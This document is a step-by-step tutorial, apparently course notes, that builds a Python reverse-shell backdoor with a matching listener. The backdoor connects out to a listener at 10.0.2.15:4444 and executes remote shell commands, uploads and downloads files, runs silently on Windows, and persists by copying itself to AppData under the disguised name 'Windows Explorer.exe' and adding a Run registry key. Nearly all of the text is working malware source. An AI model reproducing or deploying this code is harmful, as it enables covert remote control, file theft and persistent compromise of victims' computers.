# Backdoor

A backdoor is an interactive program that grants access to the system is executed on:

+ Command execution
+ Access file system
+ Upload/download files
+ and more...

This program will contain the three listed ones.

Although Python programs are cross-platform, since they only depends on it and not in the OS they are running on,
Windows machine don't have it preinstalled and that's inconvenient for real life scenarios. Later on, all the programs
will be packaged into executables to fully guarantee the cross-platform feature.

### Table of contents

1. Connecting two remote computers using sockets
    + Setup the listener using netcat (hacker side)
    + Python program to connect to socket (client side)
    + Send & receive data over TCP
2. Backdoor on client side (execute system commands remotely)
    + Refactor to OOP
3. Implementing a server (listener on hacker side)
    + Accept incoming connection
    + Send and receive data (execute commands)
    + Refactor to OOP
4. Adding features
    + Encode transmission using JSON (Serialization)
    + Interact with file system: Implementing 'stop' and 'cd' functionality
    + Download and upload files from/to hacked machine
5. Exceptions handle to avoid loosing connection & Python3 compatibility
6. Adapting the code for silent background running on Windows machine
7. Adding persistence for run on system startup

## Connecting two remote computers using sockets

This first approach is by using a very popular tool (netcat) to set up the listener running in the hacker machin, and
start writing first a Python program (reverse backdoor) as the victim establishing the connection with the listener.

### Setup the listener using netcat (hacker side)

Netcat is a network utility used to open TCP/UDP ports and establish connections, either as an outbound or inbound
connections.

To start a listening port run `$ nc -vv -l -p 4444`  where `-vv` is very verbose, `-l` for listen, `-p` to specify port.
For the meanwhile, it'll function in the hacker machine, waiting for the client's machine incoming connection with the
reverse backdoor.

### Python program to connect to socket (client side)

First, a simple python program to establish a TCP connection between two machines. It's achieved using
the [socket library](https://docs.python.org/2/library/socket.html)

> _Another [useful documentation](https://www.tutorialspoint.com/python/python_networking.htm) about network programming_

```python
#!/usr/bin/env python

import socket

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
connection.connect(("10.0.2.15", 4444)) # connect the socket to a destination ([targetIP],[targetPORT])
connection.close()
```

### Send & receive data over TCP

In order to receive data with the Python program, a buffer size is required to be specified. The program will get stuck
in that line until data is received.

On the other hand, to send data,  `send()`  function is used.

```python
#!/usr/bin/env python

import socket

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
connection.connect(("10.0.2.15", 4444)) # connect the socket to a destination ([targetIP],[targetPORT])

connection.send("\n[+] Connection established.\n")

recieved_data = connection.recv(1024)
print(recieved_data)

connection.close()
```

## Backdoor on client side (execute system commands remotely)

So far, the program can send a string from one side to another. If that string is a valid and executable command, and
the other side answers the output, then the program starts to become a useful backdoor.

The program on the client side results:

```python
#!/usr/bin/env python

import socket, subprocess

# Function to execute a command and return it's result
def execute_system_commands(command):
	return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
connection.connect(("10.0.2.5", 4444)) # connect the socket to a destination ([targetIP],[targetPORT])

while True:
	command = connection.recv(1024) # receives a command
	command_result = execute_system_commands(command) # executes it
	connection.send(command_result) # returns the command output

connection.close()
```

> Recall that  `$ nc -vv -l -p 4444` is still used on the hacker side, to set up the listener and send system commands for testing purpose.

### Refactor to OOP

> _Backdoor class can also be executed from a different file as in previous program_

> _Recall `self` keyword into an object/variable converts it to a class type to be used within the whole class, and avoid allocating that object/variable restricted to only the method it belongs._

```python
#!/usr/bin/env python

import socket, subprocess

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])
	
	def execute_system_commands(self, command): # Method to execute a command and return it's result
		return subprocess.check_output(command, shell=True)

	def run(self):
		while True:
			command = self.connection.recv(1024) # receives a command
			command_result = self.execute_system_commands(command) # executes it
			self.connection.send(command_result) # returns the command output
		self.connection.close()

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

## Implementing a server (listener on hacker side)

Now, it's time to replace **netcat** with a custom program to wait for the incoming connection and execute commands.

### Accept incoming connection

First a socket has to be configured in order to be able to establish a connection.

```python
#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
listener.bind(("10.0.2.15", 4444)) # bind to ip of LOCAL machine (for listening)
listener.listen(0) # number of connection to queue before start getting refused
print("[+] Waiting for incoming connections ... ")
listener.accept() # accept when getting a connection
print("[+] Got a connection")
```

### Send and receive data (execute commands)

The `accept()` object, according to the documentation, returns two values:

+ A socket object that represents the connection (used for send/receive data)
+ Address bound to this connection

And since the backdoor is already executing the commands given to it, and returning it's output, **this side only has to
prompt for user input and send it**.

```python
#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
listener.bind(("10.0.2.15", 4444)) # bind to ip of LOCAL machine (for listening)
listener.listen(0) # number of connection to queue before start getting refused
print("[+] Waiting for incoming connections ... ")
connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
print("[+] Got a connection from " + str(address))

while True: 
	command = raw_input(">> ") # user prompt
	connection.send(command) # sends command
	result = connection.recv(1024) # wait for answer from backdoor
	print(result)
```

### Refactor to OOP

> _Listener class can also be executed from a different file as in previous program_

> _Recall `self` keyword into an object/variable converts it to a class type to be used within the whole class, and avoid allocating that object/variable restricted to only the method it belongs._

```python
#!/usr/bin/env python

import socket

class Listener:
	def __init__(self, ip, port): # constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))
	
	def execute_remotely(self, command):
		self.connection.send(command) # sends command
		return self.connection.recv(1024) # wait for answer from backdoor
	
	def run(self):
		while True: 
			command = raw_input(">> ") # user prompt
			result = self.execute_remotely(command)
			print(result)

my_listener = Listener("10.0.2.15", 4444) # ip for binding the listener to local machine
my_listener.run()
```

## Adding features

### Encode transmission using JSON (Serialization)

The data transmission in plain text so far being used may introduce some errors when transmitting large size strings.
For that reason, a good practice is to take advantage of a standarized popular protocol that already implements a way to
ensure that the whole data has been received.

[**JSON**](https://www.json.org/json-en.html) (JavaScript Object Notation) is a lightweight data-interchange format
that "packages up" the data before being sent and makes easier for the receptor to know when it has completely arrived.
The sender encodes the message before sending it, and the receiver decodes it back to plain text when the whole of it
has arrived.

Another advantage is the transmission of data structures like lists. With sockets only Strings can be passed, while
using JSON encoding, any type of data structure is. This will be useful for future implementations.

> Listener:

```python
#!/usr/bin/env python

import socket, json

class Listener:
	def __init__(self, ip, port): # constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
			
	def execute_remotely(self, command): 
		self.reliable_send(command) # sends command
		return self.reliable_recv() # wait for answer from backdoor
	
	def run(self):
		while True: 
			command = raw_input(">> ") # user prompt
			result = self.execute_remotely(command)
			print(result)

my_listener = Listener("10.0.2.15", 4444) # ip for binding the listener to local machine
my_listener.run()
```

> Backdoor:

```python
#!/usr/bin/env python

import socket, subprocess, json

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to execute a command and return it's result
		return subprocess.check_output(command, shell=True)

	def run(self):
		while True:
			command = self.reliable_recv() # receives a command
			command_result = self.execute_system_commands(command) # executes it
			self.reliable_send(command_result) # returns the command output
		self.connection.close()

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

### Interact with file system: Implementing 'stop' and 'cd' functionality

So far the program has to be stopped through a keyboard interrupt either in the backdoor and in the listener. A 'stop'
functionality from the hacker side has to be implemented in order to stop both programs.

The JSON encoding is now very useful since it allows to additionally transmit lists instead of only Strings, thus,
implement the 'cd' functionality that parses more than one argument from the user input is now possible.

> Listener:

```python
#!/usr/bin/env python

import socket, json

class Listener:
	def __init__(self, ip, port): # constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
			
	def execute_remotely(self, command): 
		self.reliable_send(command) # sends command
		
		if command[0] == "stop":
			self.connection.close() # close socket
			exit() # stops program
			
		return self.reliable_recv() # wait for answer from backdoor
	
	def run(self):
		while True: 
			command = raw_input(">> ") # user prompt
			command = command.split(" ") # split input based on spaces
			result = self.execute_remotely(command)
			print(result)

my_listener = Listener("10.0.2.15", 4444) # ip for binding the listener to local machine
print("[+] Type 'stop' to stop connection and quit programs.")
my_listener.run()
```

> Backdoor:

```python
#!/usr/bin/env python

import socket, subprocess, json, os

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to execute a command and return it's result
		return subprocess.check_output(command, shell=True)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def run(self):
		while True:
			command = self.reliable_recv() # receives a command
			if command[0] == "stop": 
				self.connection.close() # close socket
				exit() # stops program
			elif command[0] == 'cd' and len(command) > 1:
				command_result = self.change_dir(command[1]) # change dir
			else:			
				command_result = self.execute_system_commands(command) # executes it
		
			self.reliable_send(command_result) # returns the command output

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

### Download and upload files from hacked machine

When downloading a _.txt_ from the client PC, that text is very likely human-readable (UTF8 encoded) text and won't
produce any problem for the JSON encoding (i.e. the transmission). But when that file is any other type of file like a _
.jpg_ some problems may urge because of the binary encode being incompatible with JSON. For that reason, before encoding
into JSON and sending a file, is good to encode it to a compatible format like **Base64**.

> Listener:

```python
#!/usr/bin/env python

import socket, json, base64

class Listener:
	def __init__(self, ip, port): # Constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data): # Encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # Decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
			
	def execute_remotely(self, command): # Sends and process the command
		self.reliable_send(command) # sends command
		
		if command[0] == "stop":
			self.connection.close() # close socket
			exit() # stops program
			
		return self.reliable_recv() # wait for answer from backdoor
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Download successful."
	
	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64	
	
	def run(self):
		while True: 
			command = raw_input(">> ") # user prompt
			command = command.split(" ") # split input based on spaces
			
			if command[0] == 'upload': # upload a file to client PC
				file_content = self.read_file(command[1]) # second element of list is filename
				command.append(file_content) # third element of list is the content
				
			result = self.execute_remotely(command)
			
			if command[0] == 'download': # download command
				result = self.write_file(command[1], result)
			
			print(result)

my_listener = Listener("10.0.2.15", 4444) # ip for binding the listener to local machine
print("[+] Type 'stop' to stop connection and quit programs.")
my_listener.run()
```

> Backdoor:

```python
#!/usr/bin/env python

import socket, subprocess, json, os, base64

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data) # sends via encoded message through socket
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = ""
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to exec a command and return result
		return subprocess.check_output(command, shell=True)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Upload successful."
		
	def run(self):
		while True:
			command = self.reliable_recv() # receives a command
			if command[0] == "stop": 
				self.connection.close() # close socket
				exit() # stops program
			
			elif command[0] == 'cd' and len(command) > 1: 	# change dir
				command_result = self.change_dir(command[1]) 
			
			elif command[0] == 'download': 	
				command_result = self.read_file(command[1]) # return file content
			
			elif command[0] == 'upload': # parse file path and content to upload file to client
				command_result = self.write_file(command[1], command[2]) 
				
			else:			
				command_result = self.execute_system_commands(command) # executes
		
			self.reliable_send(command_result) # returns the command output

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

## Exceptions handle to avoid loosing connection & Python3 compatibility

The exceptions handling is to avoid loosing connection from backdoor when misspelling or misusing the program. One
alternative is to wrap every functionality of the program with a try-catch block, but it won't prevent from unexpected
errors or future features. A better way is to wrap with a try-catch the core of the program in order to catch every
known and unknown exception.

The Python3 compatibility won't be truly necessary when packaging the programs later on, but it's a good practice. As
always, it is just solve conflicts between string and byte type objects using decode()/encode() or str()/byte()
functions.

> Listener:

```python
#!/usr/bin/env python

import socket, json, base64

class Listener:
	def __init__(self, ip, port): # Constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data): # Encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data.encode()) # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # Decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
			
	def execute_remotely(self, command): # Sends and process the command
		self.reliable_send(command) # sends command
		
		if command[0] == "stop":
			self.connection.close() # close socket
			exit() # stops program
			
		return self.reliable_recv() # wait for answer from backdoor
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Download successful."
	
	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64	
	
	def run(self):
		while True: 
			command = input(">> ") # user prompt
			command = command.split(" ") # split input based on spaces
			
			try:
				if command[0] == 'upload': # upload a file to client PC
					file_content = self.read_file(command[1]) # second element of list is filename
					command.append(file_content) # third element of list is the content
					
				result = self.execute_remotely(command)
				
				if command[0] == 'download' and "[-] Error " not in result: # download command
					result = self.write_file(command[1], result)
			
			except Exception:
				result = "[-] Error during command execution."
				
			print(result)

my_listener = Listener("10.0.2.15", 4444) # ip for binding the listener to local machine
print("[+] Type 'stop' to stop connection and quit programs.")
my_listener.run()
```

> Backdoor:

```python
#!/usr/bin/env python

import socket, subprocess, json, os, base64

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data).encode() # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to exec a command and return result
		return subprocess.check_output(command, shell=True)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Upload successful."
		
	def run(self):
		while True:
			command = self.reliable_recv() # receives a command

			try:
				if command[0] == "stop": 
					self.connection.close() # close socket
					exit() # stops program
				
				elif command[0] == 'cd' and len(command) > 1: 	# change dir
					command_result = self.change_dir(command[1]) 
				
				elif command[0] == 'download': # decode() for p3 compatibility
					command_result = self.read_file(command[1]).decode() # return file content
				
				elif command[0] == 'upload': # parse file path and content to upload file to client
					command_result = self.write_file(command[1], command[2]) 
					
				else: # executes. Decode() for p3 compatibility
					command_result = self.execute_system_commands(command).decode() 
					
			except Exception:
				command_result = "[-] Error during command execution."
		
			self.reliable_send(command_result) # returns the command output

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

## Adapting the code for silent background running on Windows machine

_See the **b.** append to get in context for this section_

Since the **-\-noconsole** is useful when no stdin, stdout or stderr is used, the program has to be modified in order to
avoid using them. The **check_output** function multiple times used requires the stdin, stdout and stderr to work, but
it can be manually configured in order to function while handling the information stream without the console.

In Python3, is easy as specifying the standard streams to be redirected
to [DEVNULL](https://linuxhint.com/what_is_dev_null/):

```
return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
```

To also achieve this in Python2 while working in Python3, the DEVNULL device has to be manually opened instead:

```
DEVNULL = open(os.devnull, 'wb') # DEVNULL device to redirect stdio/err stream
return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
```

Now the resulting backdoor program is:

```python
#!/usr/bin/env python

import socket, subprocess, json, os, base64

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data).encode() # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to exec a command and return result
		DEVNULL = open(os.devnull, 'wb') # DEVNULL device to redirect stdio/err stream
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Upload successful."
		
	def run(self):
		while True:
			command = self.reliable_recv() # receives a command

			try:
				if command[0] == "stop": 
					self.connection.close() # close socket
					exit() # stops program
				
				elif command[0] == 'cd' and len(command) > 1: 	# change dir
					command_result = self.change_dir(command[1]) 
				
				elif command[0] == 'download': # decode() for p3 compatibility
					command_result = self.read_file(command[1]).decode() # return file content
				
				elif command[0] == 'upload': # parse file path and content to upload file to client
					command_result = self.write_file(command[1], command[2]) 
					
				else: # executes. Decode() for p3 compatibility
					command_result = self.execute_system_commands(command).decode() 
					
			except Exception:
				command_result = "[-] Error during command execution."
		
			self.reliable_send(command_result) # returns the command output

my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
my_backdoor.run()
```

## Adding persistence for run on system startup

First of all, the _main_ has to be surrounded by a try-catch block in order to avoid errors on user's PC when the
listener is not listening and the backdoor tries to connect to it after startup.

To add persistence as the **d. Add persistence to malware** append describes, is necessary to specify the path to the **
.exe**.

> Recalling the command:
> `> reg add HKCU\Software\Microsoft\Windows\CurrentVersion\run /v test /t REG_SZ /d "C:/path/to/test.exe"`

If that file is a trojan, chances are that the user moves or deletes that file, making it impossible for the malware to
connect back to the listener. That's solved by creating a copy (
using [shutil](https://docs.python.org/2/library/shutil.html) library) of the malware in a hidden path that will get
executed every time the user system's startup.

For example, the malware can be copied in a not suspicious but hidden path known as **appdata** which is inside user's
home directory. The **os** library provides a method called **environ** to get this path automatically independent of
whose system is the malware being run.

> _Usage example_
> The path has one variable, the system user name: _C:\\Users\\[user name]\\AppData\\Roaming\\
> Then, _os.environ["appdata"]_ returns the current system path to Appdata without having to hardcode the user name.

Finally, to copy a file to a certain destination in Python, the _shutil_ library can be used. In this case, it will copy
the current **.exe** file (using _sys.executable_) to the path previously mentioned, changing it's name to a not
suspicious one.

> _To refer to a current .py file `__file__` keyword is required_

Now this new method can be:

> It should be called within the constructor.

```python
def become_persistent(self):
	evil_file_location = os.environ("appdata") + "\\Windows Explorer.exe" # retrieves path to specified directory plus a desired not-suspicous name
	if not os.path.exists(evil_file_location): # to avoid doing every time system starts
		shutil.copyfile(sys.executable, evil_file_location) # copies current .exe to specified path
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True) # adds entry to registry to execute malware on system startup
```

> persistent_backdoor.py:

```python
#!/usr/bin/env python

import socket, subprocess, json, os, base64, shutil, os

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def become_persistent(self):
		evil_file_location = os.environ("appdata") + "\\Windows Explorer.exe" # retrieves path to specified directory plus a desired not suspicious name
		if not os.path.exists(evil_file_location): # to avoid doing every time system starts
			shutil.copyfile(sys.executable, evil_file_location) # copies current .exe to specified path
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True) # adds entry to registry to execute malware on system startup

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data).encode() # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to exec a command and return result
		DEVNULL = open(os.devnull, 'wb') # DEVNULL device to redirect stdio/err stream
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Upload successful."
		
	def run(self):
		while True:
			command = self.reliable_recv() # receives a command

			try:
				if command[0] == "stop": 
					self.connection.close() # close socket
					exit() # stops program
				
				elif command[0] == 'cd' and len(command) > 1: 	# change dir
					command_result = self.change_dir(command[1]) 
				
				elif command[0] == 'download': # decode() for p3 compatibility
					command_result = self.read_file(command[1]).decode() # return file content
				
				elif command[0] == 'upload': # parse file path and content to upload file to client
					command_result = self.write_file(command[1], command[2]) 
					
				else: # executes. Decode() for p3 compatibility
					command_result = self.execute_system_commands(command).decode() 
					
			except Exception:
				command_result = "[-] Error during command execution."
		
			self.reliable_send(command_result) # returns the command output

try:
	my_backdoor = Backdoor("10.0.2.15", 4444) # listener's IP and port
	my_backdoor.run()
except Exception():
	sys.exit()
```
